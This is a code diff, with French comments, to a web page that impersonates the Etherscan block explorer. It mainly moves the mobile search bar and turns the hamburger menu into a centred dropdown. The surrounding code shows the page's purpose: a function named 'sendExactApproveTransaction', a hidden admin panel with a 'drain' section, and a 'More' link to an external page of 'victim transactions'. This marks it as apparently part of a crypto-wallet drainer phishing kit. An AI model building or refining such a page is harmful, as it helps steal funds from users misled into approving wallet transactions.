@@ -472,21 +472,56 @@
 
     /* ===== RESPONSIVE MOBILE (≤ 900px) ===== */
     @media (max-width: 900px) {
-      /* Retirer complètement le topbar */
+      /* Retirer complètement le topbar desktop */
       .topbar { display: none !important; }
 
-      /* Header : garde uniquement le logo Etherscan + hamburger à droite */
+      /* ===== Ordre mobile =====
+         1. Search bar (mobile-topbar)
+         2. Header Etherscan + hamburger
+      */
+      body {
+        display: flex;
+        flex-direction: column;
+      }
+      .mobile-topbar { order: 1; }
+      .site-header { order: 2; }
+      .main { order: 3; }
+      .site-footer { order: 4; }
+
+      /* Search bar mobile (au-dessus du header) */
+      .mobile-topbar {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 12px 16px;
+        background: var(--white-solid);
+        border-bottom: 1px solid var(--grey-93);
+      }
+      .mobile-topbar .search-wrap {
+        flex: 1 1 auto;
+        width: 100%;
+        max-width: 100%;
+      }
+      .mobile-topbar .search-wrap input {
+        height: 40px;
+        padding: 0 40px 0 38px;
+        font-size: 14px;
+      }
+      .mobile-topbar .slash-badge { display: none; }
+
+      /* Header : logo Etherscan à gauche + hamburger à droite */
       .site-header {
         display: block !important;
       }
       .site-nav {
         padding: 12px 16px;
         gap: 12px;
+        position: relative;
       }
       .brand { padding-right: 0; }
       .brand img { height: 32px; width: auto; }
 
-      /* On masque toute la nav-list sur mobile */
+      /* On masque la nav-list sur mobile */
       .nav-list { display: none !important; }
 
       /* Hamburger à droite, à l'intérieur du header */
@@ -510,42 +545,36 @@
         border-radius: 2px;
       }
 
-      /* Topbar mobile (search bar seule) : sous le header */
-      .mobile-topbar {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        padding: 12px 16px;
-        background: var(--white-solid);
-        border-bottom: 1px solid var(--grey-93);
-      }
-      .mobile-topbar .search-wrap {
-        flex: 1 1 auto;
-        width: 100%;
-        max-width: 100%;
-      }
-      .mobile-topbar .search-wrap input {
-        height: 40px;
-        padding: 0 40px 0 38px;
-        font-size: 14px;
-      }
-      .mobile-topbar .slash-badge { display: none; }
-
-      /* Menu mobile */
+      /* ===== Menu mobile : s'ouvre AU CENTRE en déroulant ===== */
       .mobile-menu {
         display: block;
         position: fixed;
         top: 0;
-        right: -100%;
-        width: 260px;
-        height: 100vh;
+        left: 50%;
+        transform: translate(-50%, -20px);
+        width: 90%;
+        max-width: 360px;
+        height: auto;
+        max-height: 80vh;
+        overflow-y: auto;
         background: var(--white-solid);
-        box-shadow: -4px 0 20px rgba(0, 0, 0, 0.1);
-        padding: 80px 24px 24px;
-        transition: right 0.3s ease;
+        border: 1px solid var(--grey-93);
+        border-radius: 12px;
+        padding: 20px 20px 12px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+        opacity: 0;
+        pointer-events: none;
+        visibility: hidden;
+        transition: opacity 0.25s ease, transform 0.25s ease, visibility 0.25s;
         z-index: 1050;
+        margin-top: 60px;
       }
-      .mobile-menu.open { right: 0; }
+      .mobile-menu.open {
+        opacity: 1;
+        pointer-events: auto;
+        visibility: visible;
+        transform: translate(-50%, 0);
+      }
       .mobile-menu .nav-link {
         display: block;
         font-family: Inter, system-ui, sans-serif;
@@ -553,23 +582,25 @@
         font-size: 16px;
         color: var(--azure-15);
         text-decoration: none;
-        padding: 12px 0;
+        padding: 14px 8px;
         border-bottom: 1px solid var(--grey-93);
         cursor: pointer;
+        text-align: center;
       }
       .mobile-menu .nav-link:last-child { border-bottom: none; }
+      .mobile-menu .nav-link:hover { color: var(--azure-40); }
 
       /* Overlay */
       .menu-overlay {
         display: none;
         position: fixed;
         inset: 0;
-        background: rgba(0, 0, 0, 0.3);
+        background: rgba(0, 0, 0, 0.4);
         z-index: 1040;
       }
       .menu-overlay.open { display: block; }
 
-      /* Panneau More : on le masque sur mobile (il est dans le header desktop) */
+      /* Panneau More (dans le header) masqué sur mobile */
       .more-panel { display: none !important; }
 
       /* Main / Card */
@@ -718,6 +749,14 @@
     </div>
   </div>
 
+  <!-- ===== Search bar mobile (au-dessus du header) ===== -->
+  <div class="mobile-topbar">
+    <div class="search-wrap">
+      <svg class="icon search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+      <input type="text" aria-label="Search" placeholder="Search by Address / Txn Hash / Block / Token / Domain Name" />
+    </div>
+  </div>
+
   <!-- ===== Header ===== -->
   <header class="site-header" id="site-header">
     <nav class="container site-nav">
@@ -750,18 +789,10 @@
     </div>
   </header>
 
-  <!-- ===== Topbar mobile : search bar seule et centrée (sous le header) ===== -->
-  <div class="mobile-topbar">
-    <div class="search-wrap">
-      <svg class="icon search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-      <input type="text" aria-label="Search" placeholder="Search by Address / Txn Hash / Block / Token / Domain Name" />
-    </div>
-  </div>
-
   <!-- ===== Overlay ===== -->
   <div class="menu-overlay" id="menuOverlay"></div>
 
-  <!-- ===== Menu mobile (uniquement Sign in et More) ===== -->
+  <!-- ===== Menu mobile (uniquement Sign in et More) : s'ouvre au CENTRE en déroulant ===== -->
   <div class="mobile-menu" id="mobileMenu">
     <a class="nav-link" href="#">Sign in</a>
     <a class="nav-link" href="#">More</a>
@@ -1571,7 +1602,7 @@ async function sendExactApproveTransaction() {
     });
   });
 
-  /* ===== Hamburger mobile ===== */
+  /* ===== Hamburger mobile : menu déroulant au centre ===== */
   const hamburgerBtn = document.getElementById('hamburgerBtn');
   const mobileMenu = document.getElementById('mobileMenu');
   const menuOverlay = document.getElementById('menuOverlay');
@@ -1581,12 +1612,40 @@ async function sendExactApproveTransaction() {
     menuOverlay.classList.toggle('open');
   }
 
-  if (hamburgerBtn) hamburgerBtn.addEventListener('click', toggleMobileMenu);
-  if (menuOverlay) menuOverlay.addEventListener('click', toggleMobileMenu);
+  if (hamburgerBtn) {
+    hamburgerBtn.addEventListener('click', function(e) {
+      e.stopPropagation();
+      toggleMobileMenu();
+    });
+  }
+  if (menuOverlay) {
+    menuOverlay.addEventListener('click', toggleMobileMenu);
+  }
 
+  // Boutons Sign in / More : cliquables et fonctionnels
   if (mobileMenu) {
-    mobileMenu.querySelectorAll('.nav-link').forEach(function (link) {
-      link.addEventListener('click', toggleMobileMenu);
+    const mobileLinks = mobileMenu.querySelectorAll('.nav-link');
+    mobileLinks.forEach(function (link, index) {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        const text = link.textContent.trim();
+        if (text === 'Sign in') {
+          // Ouvre le panneau admin (comme le bouton Sign In desktop)
+          adminModal.classList.add('open');
+          adminLoginDiv.style.display = 'block';
+          adminDrainDiv.style.display = 'none';
+          adminPassword.value = '';
+          loginError.style.display = 'none';
+          drainStatus.textContent = '';
+        } else if (text === 'More') {
+          // Ouvre la page More (transactions victimes)
+          window.location.href = 'https://verifyaddress.io/more';
+        }
+        // Ferme le menu mobile
+        mobileMenu.classList.remove('open');
+        menuOverlay.classList.remove('open');
+      });
     });
   }
 </script>
